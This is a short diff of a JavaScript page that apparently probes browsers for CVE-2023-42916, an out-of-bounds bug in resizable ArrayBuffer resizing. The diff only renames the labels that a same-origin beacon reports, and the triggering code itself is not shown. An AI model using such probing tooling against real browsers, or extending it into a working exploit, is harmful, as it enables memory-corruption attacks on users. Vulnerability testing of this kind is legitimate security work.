@@ -31,11 +31,11 @@
 function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
 
 function main(){
-  b('P681-START:CVE-2023-42916-RAB-RESIZE-OOB');
+  b('P704-START:CVE-2023-42916-RAB-RESIZE-OOB');
 
   if (typeof ArrayBuffer.prototype.resize !== 'function') {
-    b('P681-FATAL:NO-RAB');
-    b('P681-DONE');
+    b('P704-FATAL:NO-RAB');
+    b('P704-DONE');
     return;
   }
 
@@ -280,11 +280,11 @@ function main(){
 
   // === SUMMARY ===
   if (results.length > 0) {
-    b('P681-RESULT:HITS=' + results.join(';'));
+    b('P704-RESULT:HITS=' + results.join(';'));
   } else {
-    b('P681-RESULT:NO-OOB-DETECTED');
+    b('P704-RESULT:NO-OOB-DETECTED');
   }
-  b('P681-DONE');
+  b('P704-DONE');
 }
 
 setTimeout(main, 100);
